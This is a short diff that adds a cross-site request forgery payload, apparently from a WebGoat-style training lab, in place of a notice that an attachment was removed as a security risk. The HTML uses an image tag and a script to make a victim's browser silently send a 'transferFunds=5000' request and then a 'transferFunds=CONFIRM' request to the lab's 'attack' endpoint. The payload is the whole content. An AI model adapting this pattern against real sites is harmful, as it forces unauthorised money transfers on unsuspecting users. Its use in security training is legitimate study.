@@ -1,1 +1,11 @@
-This attachment was removed because it contains data that could pose a security risk.
+Hello There!
+<script type="text/javascript">
+	function setSecond() {
+		var secondImg = document.getElementById("secondImg")
+		secondImg.src="attack?Screen=1471017872&menu=900&transferFunds=CONFIRM";
+	}
+</script>
+
+<img onload=setSecond() id="firstImg" src='attack?Screen=1471017872&menu=900&transferFunds=5000'>
+<script> window.onload=setSecond() </script>
+<img id="secondImg">
